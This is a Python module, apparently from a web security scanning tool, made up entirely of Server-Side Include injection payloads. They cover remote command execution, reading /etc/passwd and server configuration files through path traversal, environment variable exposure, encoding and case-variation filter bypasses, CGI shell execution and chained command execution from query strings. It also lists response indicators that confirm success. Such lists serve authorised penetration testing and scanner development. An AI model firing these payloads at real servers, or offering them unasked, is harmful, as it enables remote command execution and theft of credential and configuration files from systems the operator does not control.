"""
Server-Side Include (SSI) Payloads

Payloads for SSI (Server-Side Include) injection attacks including:
- Command execution
- File inclusion
- Variable exposure
- Configuration manipulation
"""

# Basic SSI command execution payloads
SSI_COMMAND_EXEC = [
    {
        "name": "exec_ls",
        "payload": "<!--#exec cmd='ls'-->",
        "description": "Execute ls command via SSI",
    },
    {
        "name": "exec_cat_passwd",
        "payload": "<!--#exec cmd='cat /etc/passwd'-->",
        "description": "Read /etc/passwd via exec",
    },
    {
        "name": "exec_whoami",
        "payload": "<!--#exec cmd='whoami'-->",
        "description": "Execute whoami command",
    },
    {
        "name": "exec_id",
        "payload": "<!--#exec cmd='id'-->",
        "description": "Execute id command",
    },
    {
        "name": "exec_uname",
        "payload": "<!--#exec cmd='uname -a'-->",
        "description": "Execute uname -a command",
    },
]

# SSI file inclusion payloads
SSI_FILE_INCLUDE = [
    {
        "name": "include_virtual_passwd",
        "payload": "<!--#include virtual='/etc/passwd'-->",
        "description": "Include /etc/passwd via virtual",
    },
    {
        "name": "include_file_passwd",
        "payload": "<!--#include file='/etc/passwd'-->",
        "description": "Include /etc/passwd via file",
    },
    {
        "name": "include_virtual_config",
        "payload": "<!--#include virtual='/etc/apache2/httpd.conf'-->",
        "description": "Include Apache config file",
    },
    {
        "name": "include_file_config",
        "payload": "<!--#include file='../../config.php'-->",
        "description": "Include config via file",
    },
    {
        "name": "include_virtual_windows",
        "payload": "<!--#include virtual='C:/windows/system32/drivers/etc/hosts'-->",
        "description": "Include Windows hosts file",
    },
]

# SSI config directives
SSI_CONFIG_DIRECTIVES = [
    {
        "name": "config_timefmt",
        "payload": "<!--#config timefmt='%A'-->",
        "description": "Config timefmt directive",
    },
    {
        "name": "config_sizefmt",
        "payload": "<!--#config sizefmt='bytes'-->",
        "description": "Config sizefmt directive",
    },
    {
        "name": "config_errmsg",
        "payload": "<!--#config errmsg='ERROR'-->",
        "description": "Config errmsg directive",
    },
    {
        "name": "config_echo",
        "payload": "<!--#config echo='test'-->",
        "description": "Config echo directive",
    },
]

# SSI variable exposure
SSI_VARIABLE_EXPOSURE = [
    {
        "name": "echo_date_local",
        "payload": "<!--#echo var='DATE_LOCAL'-->",
        "description": "Expose DATE_LOCAL variable",
    },
    {
        "name": "echo_date_gmt",
        "payload": "<!--#echo var='DATE_GMT'-->",
        "description": "Expose DATE_GMT variable",
    },
    {
        "name": "echo_document_name",
        "payload": "<!--#echo var='DOCUMENT_NAME'-->",
        "description": "Expose DOCUMENT_NAME variable",
    },
    {
        "name": "echo_document_uri",
        "payload": "<!--#echo var='DOCUMENT_URI'-->",
        "description": "Expose DOCUMENT_URI variable",
    },
    {
        "name": "echo_remote_addr",
        "payload": "<!--#echo var='REMOTE_ADDR'-->",
        "description": "Expose REMOTE_ADDR variable",
    },
    {
        "name": "echo_server_name",
        "payload": "<!--#echo var='SERVER_NAME'-->",
        "description": "Expose SERVER_NAME variable",
    },
]

# SSI print directive
SSI_PRINT = [
    {
        "name": "print_env",
        "payload": "<!--#printenv -->",
        "description": "Print all environment variables",
    },
]

# SSI set directive
SSI_SET = [
    {
        "name": "set_var",
        "payload": "<!--#set var='test' value='exploit'--><!--#echo var='test'-->",
        "description": "Set and echo variable",
    },
]

# Encoded SSI payloads
SSI_ENCODED = [
    {
        "name": "url_encoded",
        "payload": "%3C!--%23exec%20cmd='ls'%20--%3E",
        "description": "URL encoded SSI",
    },
    {
        "name": "double_encoded",
        "payload": "%253C!--%2523exec%2520cmd='ls'%2520--%253E",
        "description": "Double URL encoded SSI",
    },
    {
        "name": "html_entity_encoded",
        "payload": "&lt;!--&nbsp;exec cmd='ls'--&gt;",
        "description": "HTML entity encoded SSI",
    },
]

# Case variation bypass
SSI_CASE_VARIANTS = [
    {
        "name": "uppercase_exec",
        "payload": "<!--#EXEC cmd='ls'-->",
        "description": "Uppercase EXEC directive",
    },
    {
        "name": "mixed_case_exec",
        "payload": "<!--#ExEc cmd='ls'-->",
        "description": "Mixed case EXEC directive",
    },
    {
        "name": "uppercase_include",
        "payload": "<!--#INCLUDE virtual='/etc/passwd'-->",
        "description": "Uppercase INCLUDE directive",
    },
    {
        "name": "uppercase_echo",
        "payload": "<!--#ECHO var='DATE_LOCAL'-->",
        "description": "Uppercase ECHO directive",
    },
]

# Comment-based SSI
SSI_COMMENT_BYPASS = [
    {
        "name": "comment_bypass",
        "payload": "<!--><!-#exec cmd='ls'--->",
        "description": "Comment-based bypass",
    },
    {
        "name": "nested_comment",
        "payload": "<!--#exec cmd='ls'--><!--#exec cmd='whoami'-->",
        "description": "Nested SSI commands",
    },
]

# SSI in different contexts
SSI_CONTEXTS = [
    {
        "name": "url_param",
        "payload": "?file=%3C!--%23exec%20cmd='ls'%20--%3E",
        "context": "url_parameter",
    },
    {
        "name": "form_input",
        "payload": "<!--#exec cmd='ls'-->",
        "context": "form_input",
    },
    {
        "name": "cookie_value",
        "payload": "user=%3C!--%23exec%20cmd='ls'%20--%3E",
        "context": "cookie",
    },
    {
        "name": "user_agent",
        "payload": "User-Agent: <!--#exec cmd='ls'-->",
        "context": "http_header",
    },
]

# SSI success indicators
SSI_SUCCESS_INDICATORS = [
    "root:",
    "/bin/bash",
    "/bin/sh",
    "/etc/passwd",
    "uid=",
    "gid=",
    "DOCUMENT_URI=",
    "SERVER_NAME=",
    "REMOTE_ADDR=",
]

# Common SSI directives
SSI_DIRECTIVES = [
    "config",
    "echo",
    "exec",
    "fsize",
    "flastmod",
    "include",
    "printenv",
    "set",
]

# Common SSI variables
SSI_VARIABLES = [
    "DATE_GMT",
    "DATE_LOCAL",
    "DOCUMENT_NAME",
    "DOCUMENT_URI",
    "DOCUMENT_ARGS",
    "LAST_MODIFIED",
    "REMOTE_ADDR",
    "REMOTE_HOST",
    "SERVER_NAME",
    "SERVER_PORT",
    "SERVER_PROTOCOL",
]

# Conditional SSI payloads
SSI_CONDITIONAL = [
    {
        "name": "if_expr_true",
        "payload": "<!--#if expr=\"1\" -->TRUE<!--#endif -->",
        "description": "Conditional SSI with true expression",
    },
    {
        "name": "if_expr_variable",
        "payload": "<!--#if expr=\"$DOCUMENT_URI = '/admin'\" -->ADMIN<!--#endif -->",
        "description": "Conditional based on document URI",
    },
    {
        "name": "if_else",
        "payload": "<!--#if expr=\"$REMOTE_ADDR = '127.0.0.1'\" -->LOCAL<!--#else -->REMOTE<!--#endif -->",
        "description": "If-else conditional SSI",
    },
    {
        "name": "if_elif_else",
        "payload": "<!--#if expr=\"$REQUEST_METHOD = 'GET'\" -->GET<!--#elif expr=\"$REQUEST_METHOD = 'POST'\" -->POST<!--#else -->OTHER<!--#endif -->",
        "description": "If-elif-else conditional",
    },
    {
        "name": "nested_if",
        "payload": "<!--#if expr=\"1\" --><!--#if expr=\"1\" -->NESTED<!--#endif --><!--#endif -->",
        "description": "Nested conditional SSI",
    },
]

# CGI exec SSI payloads
SSI_CGI_EXEC = [
    {
        "name": "cgi_script",
        "payload": "<!--#exec cgi=\"/cgi-bin/test.cgi\" -->",
        "description": "Execute CGI script",
    },
    {
        "name": "cgi_shell",
        "payload": "<!--#exec cgi=\"/cgi-bin/bash\" -->",
        "description": "Execute shell via CGI",
    },
    {
        "name": "cgi_perl",
        "payload": "<!--#exec cgi=\"/cgi-bin/perl.pl\" -->",
        "description": "Execute Perl CGI script",
    },
    {
        "name": "cgi_python",
        "payload": "<!--#exec cgi=\"/cgi-bin/script.py\" -->",
        "description": "Execute Python CGI script",
    },
]

# Nginx SSI payloads
NGINX_SSI = [
    {
        "name": "nginx_include_virtual",
        "payload": "<!--# include virtual=\"/internal/secret\" -->",
        "description": "Nginx SSI include virtual",
    },
    {
        "name": "nginx_include_file",
        "payload": "<!--# include file=\"/etc/passwd\" -->",
        "description": "Nginx SSI include file",
    },
    {
        "name": "nginx_set_var",
        "payload": "<!--# set var=\"test\" value=\"exploit\" --><!--# echo var=\"test\" -->",
        "description": "Nginx SSI set and echo variable",
    },
    {
        "name": "nginx_block",
        "payload": "<!--# block name=\"test\" -->CONTENT<!--# endblock -->",
        "description": "Nginx SSI block directive",
    },
    {
        "name": "nginx_config",
        "payload": "<!--# config errmsg=\"[SSI ERROR]\" -->",
        "description": "Nginx SSI config directive",
    },
]

# IIS SSI payloads
IIS_SSI = [
    {
        "name": "iis_include_file",
        "payload": "<!--#include file=\"..\\..\\..\\windows\\system.ini\" -->",
        "description": "IIS SSI path traversal",
    },
    {
        "name": "iis_include_virtual",
        "payload": "<!--#include virtual=\"/admin/config.asp\" -->",
        "description": "IIS SSI virtual include",
    },
    {
        "name": "iis_flastmod",
        "payload": "<!--#flastmod file=\"..\\..\\web.config\" -->",
        "description": "IIS SSI file last modified",
    },
    {
        "name": "iis_fsize",
        "payload": "<!--#fsize file=\"..\\..\\web.config\" -->",
        "description": "IIS SSI file size",
    },
]

# SSI expression evaluation
SSI_EXPRESSIONS = [
    {
        "name": "expr_regex",
        "payload": "<!--#if expr=\"$QUERY_STRING = /admin/\" -->MATCH<!--#endif -->",
        "description": "SSI regex expression",
    },
    {
        "name": "expr_negation",
        "payload": "<!--#if expr=\"!$HTTPS\" -->NOT_HTTPS<!--#endif -->",
        "description": "SSI negation expression",
    },
    {
        "name": "expr_and",
        "payload": "<!--#if expr=\"$REMOTE_USER && $AUTH_TYPE\" -->AUTHED<!--#endif -->",
        "description": "SSI AND expression",
    },
    {
        "name": "expr_or",
        "payload": "<!--#if expr=\"$REMOTE_USER || $HTTP_AUTHORIZATION\" -->AUTH<!--#endif -->",
        "description": "SSI OR expression",
    },
    {
        "name": "expr_comparison",
        "payload": "<!--#if expr=\"$SERVER_PORT > 80\" -->HIGH_PORT<!--#endif -->",
        "description": "SSI comparison expression",
    },
]

# SSI chaining for complex attacks
SSI_CHAINING = [
    {
        "name": "set_and_exec",
        "payload": "<!--#set var=\"cmd\" value=\"id\" --><!--#exec cmd=\"$cmd\" -->",
        "description": "Set variable and execute",
    },
    {
        "name": "include_and_set",
        "payload": "<!--#include virtual=\"/config.txt\" --><!--#set var=\"data\" value=\"$QUERY_STRING\" -->",
        "description": "Include and set variable",
    },
    {
        "name": "conditional_exec",
        "payload": "<!--#if expr=\"$QUERY_STRING\" --><!--#exec cmd=\"$QUERY_STRING\" --><!--#endif -->",
        "description": "Conditional command execution",
    },
]

# SSI via different injection contexts
SSI_INJECTION_CONTEXTS = [
    {
        "name": "json_context",
        "payload": "{\"name\": \"<!--#exec cmd='id' -->\"}",
        "context": "json",
    },
    {
        "name": "xml_context",
        "payload": "<data><!--#exec cmd='id' --></data>",
        "context": "xml",
    },
    {
        "name": "html_comment_context",
        "payload": "<!-- <!--#exec cmd='id' --> -->",
        "context": "html_comment",
    },
    {
        "name": "attribute_context",
        "payload": "<img alt=\"<!--#exec cmd='id' -->\">",
        "context": "attribute",
    },
]

# Combined payload list for easy iteration
ALL_SSI_PAYLOADS = (
    SSI_COMMAND_EXEC +
    SSI_FILE_INCLUDE +
    SSI_CONFIG_DIRECTIVES +
    SSI_VARIABLE_EXPOSURE +
    SSI_PRINT +
    SSI_SET +
    SSI_ENCODED +
    SSI_CASE_VARIANTS +
    SSI_COMMENT_BYPASS +
    SSI_CONTEXTS +
    SSI_CONDITIONAL +
    SSI_CGI_EXEC +
    NGINX_SSI +
    IIS_SSI +
    SSI_EXPRESSIONS +
    SSI_CHAINING +
    SSI_INJECTION_CONTEXTS
)
